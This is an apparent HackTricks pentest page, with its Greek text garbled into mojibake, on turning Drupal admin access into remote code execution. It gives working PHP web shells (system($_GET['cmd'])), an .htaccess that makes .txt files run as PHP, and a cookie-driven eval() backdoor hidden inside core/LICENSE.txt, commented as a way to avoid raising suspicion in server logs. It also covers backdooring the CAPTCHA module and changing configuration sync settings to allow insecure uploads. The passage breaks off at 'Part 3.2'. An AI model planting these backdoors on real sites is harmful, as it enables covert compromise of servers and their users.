# Drupal RCE

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## ÎœÎµ Ï„Î¿ Module PHP Filter

{% hint style="warning" %}
Î£Îµ Ï€Î±Î»Î±Î¹ÏŒÏ„ÎµÏÎµÏ‚ ÎµÎºÎ´ÏŒÏƒÎµÎ¹Ï‚ Ï„Î¿Ï… Drupal **(Ï€ÏÎ¹Î½ Ï„Î·Î½ Î­ÎºÎ´Î¿ÏƒÎ· 8)**, Î®Ï„Î±Î½ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯Ï„Îµ Ï‰Ï‚ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®Ï‚ ÎºÎ±Î¹ **Î½Î± ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¿ module `PHP filter`**, Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ "Î•Ï€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ Î±Î¾Î¹Î¿Î»ÏŒÎ³Î·ÏƒÎ· ÎµÎ½ÏƒÏ‰Î¼Î±Ï„Ï‰Î¼Î­Î½Î¿Ï… ÎºÏÎ´Î¹ÎºÎ±/ÎºÎ¿Î¼Î¼Î±Ï„Î¹ÏÎ½ PHP." Î‘Î»Î»Î¬ Î±Ï€ÏŒ Ï„Î·Î½ Î­ÎºÎ´Î¿ÏƒÎ· 8 Î±Ï…Ï„ÏŒ Ï„Î¿ module Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ ÎµÎ³ÎºÎ±Ï„ÎµÏƒÏ„Î·Î¼Î­Î½Î¿ Î±Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î®.
{% endhint %}

Î ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎ¯Î½Î±Î¹ ÎµÎ³ÎºÎ±Ï„ÎµÏƒÏ„Î·Î¼Î­Î½Î¿ Ï„Î¿ **plugin php** (ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î¿ Ï€Î·Î³Î±Î¯Î½Î¿Î½Ï„Î±Ï‚ ÏƒÏ„Î¿ _/modules/php_ ÎºÎ±Î¹ Î±Î½ ÎµÏ€Î¹ÏƒÏ„ÏÎ­Ï†ÎµÎ¹ **403** Ï„ÏŒÏ„Îµ, **Ï…Ï€Î¬ÏÏ‡ÎµÎ¹**, Î±Î½ **Î´ÎµÎ½ Î²ÏÎµÎ¸ÎµÎ¯**, Ï„ÏŒÏ„Îµ Ï„Î¿ **plugin php Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ ÎµÎ³ÎºÎ±Ï„ÎµÏƒÏ„Î·Î¼Î­Î½Î¿**)

Î Î·Î³Î±Î¯Î½ÎµÏ„Îµ ÏƒÏ„Î¿ _Modules_ -> (**Î•Î»Î­Î³Î¾Ï„Îµ**) _PHP Filter_ -> _Î‘Ï€Î¿Î¸Î®ÎºÎµÏ…ÏƒÎ· ÏÏ…Î¸Î¼Î¯ÏƒÎµÏ‰Î½_

![](<../../../.gitbook/assets/image (247) (1).png>)

Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, ÎºÎ¬Î½Ï„Îµ ÎºÎ»Î¹Îº ÏƒÏ„Î¿ _Î ÏÎ¿ÏƒÎ¸Î®ÎºÎ· Ï€ÎµÏÎ¹ÎµÏ‡Î¿Î¼Î­Î½Î¿Ï…_ -> Î•Ï€Î¹Î»Î­Î¾Ï„Îµ _Basic Page_ Î® _Article -_> Î“ÏÎ¬ÏˆÏ„Îµ _php shellcode ÏƒÏ„Î¿ ÏƒÏÎ¼Î±_ -> Î•Ï€Î¹Î»Î­Î¾Ï„Îµ _PHP code_ ÏƒÏ„Î·Î½ _ÎœÎ¿ÏÏ†Î® ÎºÎµÎ¹Î¼Î­Î½Î¿Ï…_ -> Î•Ï€Î¹Î»Î­Î¾Ï„Îµ _Î ÏÎ¿ÎµÏ€Î¹ÏƒÎºÏŒÏ€Î·ÏƒÎ·_

![](<../../../.gitbook/assets/image (338).png>)

Î¤Î­Î»Î¿Ï‚, Î±Ï€Î»Î¬ Î±Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿Î½ Î½ÎµÎ¿Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¸Î­Î½Ï„Î± ÎºÏŒÎ¼Î²Î¿:
```bash
curl http://drupal-site.local/node/3
```
## Î•Î³ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· Ï„Î¿Ï… PHP Filter Module

{% hint style="warning" %}
Î£Ï„Î¹Ï‚ Ï„ÏÎ­Ï‡Î¿Ï…ÏƒÎµÏ‚ ÎµÎºÎ´ÏŒÏƒÎµÎ¹Ï‚ Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ Ï€Î»Î­Î¿Î½ Î´Ï…Î½Î±Ï„Î® Î· ÎµÎ³ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· Ï€ÏÏŒÏƒÎ¸ÎµÏ„Ï‰Î½ Î¼ÏŒÎ½Î¿ Î¼Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ Î´Î¹Î±Î´Î¯ÎºÏ„Ï…Î¿ Î¼ÎµÏ„Î¬ Ï„Î·Î½ Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î· ÎµÎ³ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ·.
{% endhint %}

Î‘Ï€ÏŒ Ï„Î·Î½ Î­ÎºÎ´Î¿ÏƒÎ· **8 ÎºÎ±Î¹ Î¼ÎµÏ„Î¬, Ï„Î¿** [**PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **module Î´ÎµÎ½ ÎµÎ³ÎºÎ±Î¸Î¯ÏƒÏ„Î±Ï„Î±Î¹ Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î±**. Î“Î¹Î± Î½Î± Î±Î¾Î¹Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î¼Îµ Î±Ï…Ï„Î® Ï„Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÎºÏŒÏ„Î·Ï„Î±, Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± **ÎµÎ³ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÎ¿Ï…Î¼Îµ Ï„Î¿ module Î¼ÏŒÎ½Î¿Î¹ Î¼Î±Ï‚**.

1. ÎšÎ±Ï„ÎµÎ²Î¬ÏƒÏ„Îµ Ï„Î·Î½ Ï€Î¹Î¿ Ï€ÏÏŒÏƒÏ†Î±Ï„Î· Î­ÎºÎ´Î¿ÏƒÎ· Ï„Î¿Ï… module Î±Ï€ÏŒ Ï„Î·Î½ Î¹ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´Î± Ï„Î¿Ï… Drupal.
1. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
2. Î‘Ï†Î¿Ï ÎºÎ±Ï„ÎµÎ²ÎµÎ¯, Ï€Î·Î³Î±Î¯Î½ÎµÏ„Îµ ÏƒÏ„Î¿ **`Administration`** > **`Reports`** > **`Available updates`**.
3. ÎšÎ¬Î½Ï„Îµ ÎºÎ»Î¹Îº ÏƒÏ„Î¿ **`Browse`**, ÎµÏ€Î¹Î»Î­Î¾Ï„Îµ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ Î±Ï€ÏŒ Ï„Î¿Î½ Ï†Î¬ÎºÎµÎ»Î¿ Ï€Î¿Ï… Ï„Î¿ ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎ±Ï„Îµ ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± ÎºÎ¬Î½Ï„Îµ ÎºÎ»Î¹Îº ÏƒÏ„Î¿ **`Install`**.
4. Î‘Ï†Î¿Ï ÎµÎ³ÎºÎ±Ï„Î±ÏƒÏ„Î±Î¸ÎµÎ¯ Ï„Î¿ module, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎºÎ¬Î½ÎµÏ„Îµ ÎºÎ»Î¹Îº ÏƒÏ„Î¿ **`Content`** ÎºÎ±Î¹ **Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î¼Î¹Î± Î½Î­Î± Î²Î±ÏƒÎ¹ÎºÎ® ÏƒÎµÎ»Î¯Î´Î±**, Ï€Î±ÏÏŒÎ¼Î¿Î¹Î± Î¼Îµ Ï„Î¿ Ï€ÏÏ‚ ÎºÎ¬Î½Î±Î¼Îµ ÏƒÏ„Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Ï„Î¿Ï… Drupal 7. ÎšÎ±Î¹ Ï€Î¬Î»Î¹, Î²ÎµÎ²Î±Î¹Ï‰Î¸ÎµÎ¯Ï„Îµ ÏŒÏ„Î¹ **Î­Ï‡ÎµÏ„Îµ ÎµÏ€Î¹Î»Î­Î¾ÎµÎ¹ `PHP code` Î±Ï€ÏŒ Ï„Î¿ Î±Î½Î±Ï€Ï„Ï…ÏƒÏƒÏŒÎ¼ÎµÎ½Î¿ Î¼ÎµÎ½Î¿Ï `Text format`**.

## Backdoored Module

{% hint style="warning" %}
Î£Ï„Î¹Ï‚ Ï„ÏÎ­Ï‡Î¿Ï…ÏƒÎµÏ‚ ÎµÎºÎ´ÏŒÏƒÎµÎ¹Ï‚ Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ Ï€Î»Î­Î¿Î½ Î´Ï…Î½Î±Ï„Î® Î· ÎµÎ³ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· Ï€ÏÏŒÏƒÎ¸ÎµÏ„Ï‰Î½ Î¼ÏŒÎ½Î¿ Î¼Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ Î´Î¹Î±Î´Î¯ÎºÏ„Ï…Î¿ Î¼ÎµÏ„Î¬ Ï„Î·Î½ Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î· ÎµÎ³ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ·.
{% endhint %}

ÎˆÎ½Î± backdoored module Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¸ÎµÎ¯ **Ï€ÏÎ¿ÏƒÎ¸Î­Ï„Î¿Î½Ï„Î±Ï‚ Î­Î½Î± shell ÏƒÎµ Î­Î½Î± Ï…Ï€Î¬ÏÏ‡Î¿Î½ module**. Î¤Î± modules Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î²ÏÎµÎ¸Î¿ÏÎ½ ÏƒÏ„Î·Î½ Î¹ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´Î± drupal.org. Î‘Ï‚ ÎµÏ€Î¹Î»Î­Î¾Î¿Ï…Î¼Îµ Î­Î½Î± module ÏŒÏ€Ï‰Ï‚ Ï„Î¿ [CAPTCHA](https://www.drupal.org/project/captcha). ÎšÎ¬Î½Ï„Îµ ÎºÏÎ»Î¹ÏƒÎ· Ï€ÏÎ¿Ï‚ Ï„Î± ÎºÎ¬Ï„Ï‰ ÎºÎ±Î¹ Î±Î½Ï„Î¹Î³ÏÎ¬ÏˆÏ„Îµ Ï„Î¿Î½ ÏƒÏÎ½Î´ÎµÏƒÎ¼Î¿ Î³Î¹Î± Ï„Î¿ tar.gz [Î±ÏÏ‡ÎµÎ¯Î¿](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz).

* ÎšÎ±Ï„ÎµÎ²Î¬ÏƒÏ„Îµ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ ÎºÎ±Î¹ ÎµÎ¾Î±Î³Î¬Î³ÎµÏ„Îµ Ï„Î¿ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½ÏŒ Ï„Î¿Ï….
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÏ„Îµ Î­Î½Î± **PHP web shell** Î¼Îµ Ï„Î± Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î±:
```php
<?php
system($_GET["cmd"]);
?>
```
* Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎ¿Ï…Î¼Îµ Î­Î½Î± **`.htaccess`** Î±ÏÏ‡ÎµÎ¯Î¿ Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎ¿Ï…Î¼Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿Î½ Ï†Î¬ÎºÎµÎ»Î¿. Î‘Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î¿ ÎºÎ±Î¸ÏÏ‚ Ï„Î¿ Drupal Î±ÏÎ½ÎµÎ¯Ï„Î±Î¹ Ï„Î·Î½ Î¬Î¼ÎµÏƒÎ· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿Î½ Ï†Î¬ÎºÎµÎ»Î¿ **`/modules`**.
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* Î— Ï€Î±ÏÎ±Ï€Î¬Î½Ï‰ ÏÏÎ¸Î¼Î¹ÏƒÎ· Î¸Î± ÎµÏ†Î±ÏÎ¼ÏŒÏƒÎµÎ¹ ÎºÎ±Î½ÏŒÎ½ÎµÏ‚ Î³Î¹Î± Ï„Î¿Î½ Ï†Î¬ÎºÎµÎ»Î¿ / ÏŒÏ„Î±Î½ Î¶Î·Ï„Î¬Î¼Îµ Î­Î½Î± Î±ÏÏ‡ÎµÎ¯Î¿ ÏƒÏ„Î¿Î½ Ï†Î¬ÎºÎµÎ»Î¿ /modules. Î‘Î½Ï„Î¹Î³ÏÎ¬ÏˆÏ„Îµ ÎºÎ±Î¹ Ï„Î± Î´ÏÎ¿ Î±Ï…Ï„Î¬ Î±ÏÏ‡ÎµÎ¯Î± ÏƒÏ„Î¿Î½ Ï†Î¬ÎºÎµÎ»Î¿ captcha ÎºÎ±Î¹ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÏ„Îµ Î­Î½Î± Î±ÏÏ‡ÎµÎ¯Î¿.
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* Assuming we have **administrative access** to the website, click on **`Manage`** and then **`Extend`** on the sidebar. Next, click on the **`+ Install new module`** button, and we will be taken to the install page, such as `http://drupal-site.local/admin/modules/install` Browse to the backdoored Captcha archive and click **`Install`**.
* Once the installation succeeds, browse to **`/modules/captcha/shell.php`** to execute commands.

## Backdooring Drupal with Configuration synchronization <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**Post shared by** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### Part 1 (activation of _Media_ and _Media Library_)

In the _Extend_ menu (/admin/modules), you can activate what appear to be plugins already installed. By default, plugins _Media_ and _Media Library_ donâ€™t appear to be activated, so letâ€™s activate them.

Before activation:

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

After activation:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Part 2 (leveraging feature _Configuration synchronization_) <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

Weâ€™ll leverage the _Configuration synchronization_ feature to dump (export) and upload (import) Drupal configuration entries:

* /admin/config/development/configuration/single/export
* /admin/config/development/configuration/single/import

**Patch system.file.yml**

Letâ€™s start by patching the first entry `allow_insecure_uploads` from:

File: system.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Î“Î¹Î±:

Î‘ÏÏ‡ÎµÎ¯Î¿: system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Î”Î¹ÏŒÏÎ¸Ï‰ÏƒÎ· field.field.media.document.field\_media\_document.yml**

Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Î´Î¹ÏŒÏÎ¸Ï‰ÏƒÎµ Ï„Î·Î½ Î´ÎµÏÏ„ÎµÏÎ· ÎºÎ±Ï„Î±Ï‡ÏÏÎ·ÏƒÎ· `file_extensions` Î±Ï€ÏŒ:

File: field.field.media.document.field\_media\_document.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

Î“Î¹Î±:

Î‘ÏÏ‡ÎµÎ¯Î¿: field.field.media.document.field\_media\_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> Î”ÎµÎ½ Ï„Î¿ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Ï ÏƒÎµ Î±Ï…Ï„Î® Ï„Î·Î½ Î±Î½Î¬ÏÏ„Î·ÏƒÎ·, Î±Î»Î»Î¬ ÏƒÎ·Î¼ÎµÎ¹ÏÎ½ÎµÏ„Î±Î¹ ÏŒÏ„Î¹ ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î¿ÏÎ¹ÏƒÏ„ÎµÎ¯ Î· ÎµÎ¯ÏƒÎ¿Î´Î¿Ï‚ `file_directory` Î¼Îµ Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î¿ Ï„ÏÏŒÏ€Î¿ ÎºÎ±Î¹ ÏŒÏ„Î¹ ÎµÎ¯Î½Î±Î¹ ÎµÏ…Î¬Î»Ï‰Ï„Î· ÏƒÎµ ÎµÏ€Î¯Î¸ÎµÏƒÎ· Î´Î¹Î±Î´ÏÎ¿Î¼Î®Ï‚ (path traversal) (Î­Ï„ÏƒÎ¹ Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± ÎµÏ€Î¹ÏƒÏ„ÏÎ­ÏˆÎ¿Ï…Î¼Îµ Ï€Î¯ÏƒÏ‰ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ Î´Î­Î½Ï„ÏÎ¿ ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î¿Ï‚ Î±ÏÏ‡ÎµÎ¯Ï‰Î½ Ï„Î¿Ï… Drupal).

<figure><img src="../../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

### ÎœÎ­ÏÎ¿Ï‚ 3 (ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Ï„Î·Ï‚ Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î±Ï‚ _Î ÏÎ¿ÏƒÎ¸Î®ÎºÎ· Î•Î³Î³ÏÎ¬Ï†Î¿Ï…_) <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

Î¤Î¿ Ï„ÎµÎ»ÎµÏ…Ï„Î±Î¯Î¿ Î²Î®Î¼Î± ÎµÎ¯Î½Î±Î¹ Ï„Î¿ Ï€Î¹Î¿ Î±Ï€Î»ÏŒ ÎºÎ±Î¹ Ï‡Ï‰ÏÎ¯Î¶ÎµÏ„Î±Î¹ ÏƒÎµ Î´ÏÎ¿ Ï…Ï€Î¿Î²Î®Î¼Î±Ï„Î±. Î¤Î¿ Ï€ÏÏÏ„Î¿ ÎµÎ¯Î½Î±Î¹ Î½Î± Î±Î½ÎµÎ²Î¬ÏƒÎ¿Ï…Î¼Îµ Î­Î½Î± Î±ÏÏ‡ÎµÎ¯Î¿ ÏƒÎµ Î¼Î¿ÏÏ†Î® .htaccess Î³Î¹Î± Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„Î¿ÏÎ¼Îµ Ï„Î¹Ï‚ Î¿Î´Î·Î³Î¯ÎµÏ‚ Ï„Î¿Ï… Apache ÎºÎ±Î¹ Î½Î± ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎ¿Ï…Î¼Îµ ÏƒÏ„Î± Î±ÏÏ‡ÎµÎ¯Î± .txt Î½Î± ÎµÏÎ¼Î·Î½ÎµÏÎ¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î· Î¼Î·Ï‡Î±Î½Î® PHP. Î¤Î¿ Î´ÎµÏÏ„ÎµÏÎ¿ ÎµÎ¯Î½Î±Î¹ Î½Î± Î±Î½ÎµÎ²Î¬ÏƒÎ¿Ï…Î¼Îµ Î­Î½Î± Î±ÏÏ‡ÎµÎ¯Î¿ .txt Ï€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Ï„Î¿ payload Î¼Î±Ï‚.

Î‘ÏÏ‡ÎµÎ¯Î¿: .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
Î“Î¹Î±Ï„Î¯ ÎµÎ¯Î½Î±Î¹ Î±Ï…Ï„ÏŒ Ï„Î¿ ÎºÏŒÎ»Ï€Î¿ Ï‰ÏÎ±Î¯Î¿;

Î•Ï€ÎµÎ¹Î´Î® Î¼ÏŒÎ»Î¹Ï‚ Ï„Î¿ Webshell (Ï€Î¿Ï… Î¸Î± Î¿Î½Î¿Î¼Î¬ÏƒÎ¿Ï…Î¼Îµ LICENSE.txt) Ï„Î¿Ï€Î¿Î¸ÎµÏ„Î·Î¸ÎµÎ¯ ÏƒÏ„Î¿Î½ Web server, Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± Î¼ÎµÏ„Î±Î´ÏÏƒÎ¿Ï…Î¼Îµ Ï„Î¹Ï‚ ÎµÎ½Ï„Î¿Î»Î­Ï‚ Î¼Î±Ï‚ Î¼Î­ÏƒÏ‰ `$_COOKIE` ÎºÎ±Î¹ ÏƒÏ„Î± Î±ÏÏ‡ÎµÎ¯Î± ÎºÎ±Ï„Î±Î³ÏÎ±Ï†Î®Ï‚ Ï„Î¿Ï… Web server, Î±Ï…Ï„ÏŒ Î¸Î± ÎµÎ¼Ï†Î±Î½Î¹ÏƒÏ„ÎµÎ¯ Ï‰Ï‚ Î­Î½Î± Î½ÏŒÎ¼Î¹Î¼Î¿ GET Î±Î¯Ï„Î·Î¼Î± ÏƒÎµ Î­Î½Î± Î±ÏÏ‡ÎµÎ¯Î¿ ÎºÎµÎ¹Î¼Î­Î½Î¿Ï….

Î“Î¹Î±Ï„Î¯ Î½Î± Î¿Î½Î¿Î¼Î¬ÏƒÎ¿Ï…Î¼Îµ Ï„Î¿ Webshell Î¼Î±Ï‚ LICENSE.txt;

Î‘Ï€Î»Î¬ ÎµÏ€ÎµÎ¹Î´Î® Î±Î½ Ï€Î¬ÏÎ¿Ï…Î¼Îµ Ï„Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Î±ÏÏ‡ÎµÎ¯Î¿, Î³Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt) (Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ ÎµÎ¯Î½Î±Î¹ Î®Î´Î· Ï€Î±ÏÏŒÎ½ ÏƒÏ„Î¿Î½ Ï€Ï…ÏÎ®Î½Î± Ï„Î¿Ï… Drupal), Î­Ï‡Î¿Ï…Î¼Îµ Î­Î½Î± Î±ÏÏ‡ÎµÎ¯Î¿ 339 Î³ÏÎ±Î¼Î¼ÏÎ½ ÎºÎ±Î¹ 17.6 KB ÏƒÎµ Î¼Î­Î³ÎµÎ¸Î¿Ï‚, Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ ÎµÎ¯Î½Î±Î¹ Ï„Î­Î»ÎµÎ¹Î¿ Î³Î¹Î± Î½Î± Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎ¿Ï…Î¼Îµ Î­Î½Î± Î¼Î¹ÎºÏÏŒ Î±Ï€ÏŒÏƒÏ€Î±ÏƒÎ¼Î± ÎºÏÎ´Î¹ÎºÎ± PHP ÏƒÏ„Î· Î¼Î­ÏƒÎ· (ÎºÎ±Î¸ÏÏ‚ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ ÎµÎ¯Î½Î±Î¹ Î±ÏÎºÎµÏ„Î¬ Î¼ÎµÎ³Î¬Î»Î¿).

<figure><img src="../../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

Î‘ÏÏ‡ÎµÎ¯Î¿: Î”Î¹Î¿ÏÎ¸Ï‰Î¼Î­Î½Î¿ LICENSE.txt
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **ÎœÎ­ÏÎ¿Ï‚ 3.1 (Î±Î½Î­Î²Î±ÏƒÎ¼Î± Î±ÏÏ‡ÎµÎ¯Î¿Ï… .htaccess)**

Î‘ÏÏ‡Î¹ÎºÎ¬, ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…ÏŒÎ¼Î±ÏƒÏ„Îµ Ï„Î· Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± _Î ÏÎ¿ÏƒÎ¸Î®ÎºÎ· Î•Î³Î³ÏÎ¬Ï†Î¿Ï…_ (/media/add/document) Î³Î¹Î± Î½Î± Î±Î½ÎµÎ²Î¬ÏƒÎ¿Ï…Î¼Îµ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ Î¼Î±Ï‚ Ï€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Ï„Î¹Ï‚ Î¿Î´Î·Î³Î¯ÎµÏ‚ Apache (.htaccess).

<figure><img src="../../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>

**ÎœÎ­ÏÎ¿Ï‚ 3.2 (Î±Î½Î­Î²Î±ÏƒÎ¼Î± Î±ÏÏ‡ÎµÎ¯Î¿Ï… LICENSE.txt)**

